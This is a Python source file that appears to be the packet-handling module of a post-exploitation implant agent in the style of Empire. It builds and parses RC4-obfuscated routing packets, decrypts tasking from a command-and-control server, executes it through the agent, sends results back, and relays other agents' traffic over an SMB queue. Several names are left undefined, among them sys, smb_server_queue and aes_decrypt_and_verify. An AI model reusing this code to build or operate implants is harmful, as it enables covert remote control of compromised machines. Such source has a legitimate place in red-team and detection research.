import base64
import os
import struct


class PacketHandler:
    def __init__(self, agent, staging_key, session_id, key=None):
        self.agent = agent
        self.key = key
        self.staging_key = staging_key
        self.session_id = session_id
        self.missedCheckins = 0

        self.language_list = {
            'NONE': 0,
            'POWERSHELL': 1,
            'PYTHON': 2
        }
        self.language_ids = {ID: name for name, ID in self.language_list.items()}

        self.meta = {
            'NONE': 0,
            'STAGING_REQUEST': 1,
            'STAGING_RESPONSE': 2,
            'TASKING_REQUEST': 3,
            'RESULT_POST': 4,
            'SERVER_RESPONSE': 5
        }
        self.meta_ids = {ID: name for name, ID in self.meta.items()}

        self.additional = {}
        self.additional_ids = {ID: name for name, ID in self.additional.items()}

    def rc4(self, key, data):
        """
        RC4 encrypt/decrypt the given data input with the specified key.

        From: http://stackoverflow.com/questions/29607753/how-to-decrypt-a-file-that-encrypted-with-rc4-using-python
        """
        S, j, out = list(range(256)), 0, []
        # This might break python 2.7
        key = bytearray(key)
        # KSA Phase
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        # this might also break python 2.7
        # data = bytearray(data)
        # PRGA Phase
        i = j = 0

        for char in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            if sys.version[0] == "2":
                char = ord(char)
            out.append(chr(char ^ S[(S[i] + S[j]) % 256]).encode('latin-1'))
        # out = str(out)
        tmp = b''.join(out)
        return tmp

    def parse_routing_packet(self, staging_key, data):
        """
        Decodes the rc4 "routing packet" and parses raw agent data into:

            {sessionID : (language, meta, additional, [encData]), ...}

        Routing packet format:

            +---------+-------------------+--------------------------+
            | RC4 IV  | RC4s(RoutingData) | AESc(client packet data) | ...
            +---------+-------------------+--------------------------+
            |    4    |         16        |        RC4 length        |
            +---------+-------------------+--------------------------+

            RC4s(RoutingData):
            +-----------+------+------+-------+--------+
            | SessionID | Lang | Meta | Extra | Length |
            +-----------+------+------+-------+--------+
            |    8      |  1   |  1   |   2   |    4   |
            +-----------+------+------+-------+--------+

        """

        if data:
            results = {}
            offset = 0

            # ensure we have at least the 20 bytes for a routing packet
            if len(data) >= 20:

                while True:

                    if len(data) - offset < 20:
                        break

                    RC4IV = data[0 + offset:4 + offset]
                    RC4data = data[4 + offset:20 + offset]
                    routingPacket = self.rc4(RC4IV + staging_key, RC4data)

                    session_id = routingPacket[0:8]

                    # B == 1 byte unsigned char, H == 2 byte unsigned short, L == 4 byte unsigned long
                    (language, meta, additional, length) = struct.unpack("=BBHL", routingPacket[8:])

                    if length < 0:
                        encData = None
                    else:
                        encData = data[(20 + offset):(20 + offset + length)]

                    results[session_id] = (self.language_ids.get(language, 'NONE'), self.meta_ids.get(meta, 'NONE'),
                                          self.additional_ids.get(additional, 'NONE'), encData)

                    # check if we're at the end of the packet processing
                    remainingData = data[20 + offset + length:]
                    if not remainingData or remainingData == '':
                        break

                    offset += 20 + length
                return results

            else:
                # print("[*] parse_agent_data() data length incorrect: %s" % (len(data)))
                return None

        else:
            # print("[*] parse_agent_data() data is None")
            return None

    def build_routing_packet(self, staging_key, session_id, meta=0, additional=0, enc_data=b''):
        """
        Takes the specified parameters for an RC4 "routing packet" and builds/returns
        an HMAC'ed RC4 "routing packet".

        packet format:

            Routing Packet:
            +---------+-------------------+--------------------------+
            | RC4 IV  | RC4s(RoutingData) | AESc(client packet data) | ...
            +---------+-------------------+--------------------------+
            |    4    |         16        |        RC4 length        |
            +---------+-------------------+--------------------------+

            RC4s(RoutingData):
            +-----------+------+------+-------+--------+
            | SessionID | Lang | Meta | Extra | Length |
            +-----------+------+------+-------+--------+
            |    8      |  1   |  1   |   2   |    4   |
            +-----------+------+------+-------+--------+

        """

        # binary pack all the passed config values as unsigned numbers
        #   B == 1 byte unsigned char, H == 2 byte unsigned short, L == 4 byte unsigned long
        data = session_id + struct.pack("=BBHL", 2, meta, additional, len(enc_data))
        RC4IV = os.urandom(4)
        key = RC4IV + staging_key
        rc4EncData = self.rc4(key, data)
        packet = RC4IV + rc4EncData + enc_data
        return packet

    def decode_routing_packet(self, data):
        """
        Parse ALL routing packets and only process the ones applicable
        to this agent.
        """
        # returns {sessionID : (language, meta, additional, [encData]), ...}
        packets = self.parse_routing_packet(self.staging_key, data)
        if packets is None:
            return
        for agentID, packet in packets.items():
            if agentID == self.session_id:
                (language, meta, additional, encData) = packet
                # if meta == 'SERVER_RESPONSE':
                self.process_tasking(encData)
            else:
                smb_server_queue.Enqueue(base64.b64encode(data).decode('UTF-8'))

    def build_response_packet(self, tasking_id, packet_data, result_id=0):
        """
        Build a task packet for an agent.

            [2 bytes] - type
            [2 bytes] - total # of packets
            [2 bytes] - packet #
            [2 bytes] - task/result ID
            [4 bytes] - length
            [X...]    - result data

            +------+--------------------+----------+---------+--------+-----------+
            | Type | total # of packets | packet # | task ID | Length | task data |
            +------+--------------------+--------------------+--------+-----------+
            |  2   |         2          |    2     |    2    |   4    | <Length>  |
            +------+--------------------+----------+---------+--------+-----------+
        """
        packetType = struct.pack("=H", tasking_id)
        totalPacket = struct.pack("=H", 1)
        packetNum = struct.pack("=H", 1)
        result_id = struct.pack("=H", result_id)

        if packet_data:
            if isinstance(packet_data, str):
                packet_data = base64.b64encode(packet_data.encode("utf-8", "ignore"))
            else:
                packet_data = base64.b64encode(
                    packet_data.decode("utf-8").encode("utf-8", "ignore")
                )
            if len(packet_data) % 4:
                packet_data += "=" * (4 - len(packet_data) % 4)

            length = struct.pack("=L", len(packet_data))
            return packetType + totalPacket + packetNum + result_id + length + packet_data
        else:
            length = struct.pack("=L", 0)
            return packetType + totalPacket + packetNum + result_id + length

    def parse_task_packet(self, packet, offset=0):
        """
        Parse a result packet-

            [2 bytes] - type
            [2 bytes] - total # of packets
            [2 bytes] - packet #
            [2 bytes] - task/result ID
            [4 bytes] - length
            [X...]    - result data

            +------+--------------------+----------+---------+--------+-----------+
            | Type | total # of packets | packet # | task ID | Length | task data |
            +------+--------------------+--------------------+--------+-----------+
            |  2   |         2          |    2     |    2    |   4    | <Length>  |
            +------+--------------------+----------+---------+--------+-----------+

        Returns a tuple with (responseName, length, data, remainingData)

        Returns a tuple with (responseName, totalPackets, packetNum, resultID, length, data, remainingData)
        """
        try:
            packetType = struct.unpack("=H", packet[0 + offset : 2 + offset])[0]
            totalPacket = struct.unpack("=H", packet[2 + offset : 4 + offset])[0]
            packetNum = struct.unpack("=H", packet[4 + offset : 6 + offset])[0]
            resultID = struct.unpack("=H", packet[6 + offset : 8 + offset])[0]
            length = struct.unpack("=L", packet[8 + offset : 12 + offset])[0]
            try:
                packetData = packet.decode("UTF-8")[12 + offset : 12 + offset + length]
            except:
                packetData = packet[12 + offset : 12 + offset + length].decode("latin-1")

            try:
                remainingData = packet.decode("UTF-8")[12 + offset + length :]
            except:
                remainingData = packet[12 + offset + length :].decode("latin-1")

            return (
                packetType,
                totalPacket,
                packetNum,
                resultID,
                length,
                packetData,
                remainingData,
            )
        except Exception as e:
            print("parse_task_packet exception:", e)
            return (None, None, None, None, None, None, None)

    def process_tasking(self, data):
        # processes an encrypted data packet
        #   -decrypts/verifies the response to get
        #   -extracts the packets and processes each
        try:
            # aes_decrypt_and_verify is in stager.py
            tasking = aes_decrypt_and_verify(self.key, data).encode("UTF-8")
            (
                packetType,
                totalPacket,
                packetNum,
                resultID,
                length,
                data,
                remainingData,
            ) = self.parse_task_packet(tasking)

            # execute/process the packets and get any response
            resultPackets = ""
            result = self.agent.process_packet(packetType, data, resultID)

            if result:
                resultPackets += result

            packetOffset = 12 + length
            while remainingData and remainingData != "":
                (
                    packetType,
                    totalPacket,
                    packetNum,
                    resultID,
                    length,
                    data,
                    remainingData,
                ) = self.parse_task_packet(tasking, offset=packetOffset)
                result = self.agent.process_packet(packetType, data, resultID)
                if result:
                    resultPackets += result

                packetOffset += 12 + length

            # send_message() is patched in from the listener module
            self.send_message(resultPackets)

        except Exception as e:
            print(e)
            pass

    def process_job_tasking(self, result):
        # process job data packets
        #  - returns to the C2
        # execute/process the packets and get any response
        try:
            resultPackets = b""
            if result:
                resultPackets += result
            # send packets
            self.send_message(resultPackets)
        except Exception as e:
            print("processJobTasking exception:", e)
            pass
